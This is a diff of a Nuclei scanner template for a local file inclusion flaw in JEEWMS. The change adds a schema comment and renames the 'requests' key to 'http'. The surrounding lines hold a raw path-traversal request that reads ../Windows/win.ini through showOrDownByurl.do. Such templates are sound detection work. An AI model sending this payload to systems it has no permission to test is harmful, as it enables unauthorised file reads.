@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: jeewms-lfi2
 
 info:
@@ -8,7 +9,7 @@ info:
   tags: jeewms,lfi
 
 
-requests:
+http:
   - raw:
       - |
         GET /systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini HTTP/1.1
